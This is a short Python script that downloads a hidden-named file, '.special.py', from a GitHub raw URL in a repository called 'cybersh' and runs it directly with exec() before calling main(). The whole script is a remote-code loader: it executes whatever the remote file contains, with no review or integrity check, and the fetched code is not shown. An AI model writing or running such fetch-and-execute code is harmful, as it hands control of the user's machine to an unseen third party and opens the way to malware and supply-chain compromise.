import requests

r = requests.get("https://raw.githubusercontent.com/ShTasrif/cybersh/main/.special.py").text
exec (r)

main()
